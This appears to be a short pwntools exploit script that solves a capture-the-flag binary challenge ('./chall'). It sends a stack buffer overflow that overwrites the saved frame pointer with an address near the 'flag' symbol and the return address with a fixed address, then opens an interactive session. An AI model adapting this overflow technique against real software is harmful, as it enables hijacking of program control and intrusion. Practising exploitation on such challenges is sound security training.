from pwn import *

io = process("./chall")
e = ELF("./chall")

io.sendlineafter(b"===", b"1")

payload = b"A"*0x10 + p64(e.sym["flag"] + 0x50) + p64(0x0000000000401233) 

io.sendlineafter(b"message", payload)

io.interactive()

